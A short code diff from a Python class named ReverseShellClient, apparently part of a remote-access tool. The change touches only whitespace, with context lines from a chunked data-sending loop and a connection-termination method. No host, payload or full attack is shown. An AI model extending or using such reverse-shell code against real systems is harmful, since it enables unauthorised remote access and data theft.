@@ -137,8 +137,7 @@ class ReverseShellClient:
                             break
                         self.comm.send(chunk)
                 self.comm.send(b"done+*<+")
-
-                    
+       
     def kill_connection(self):
         """Gracefully terminate the connection"""
         self.alive = False
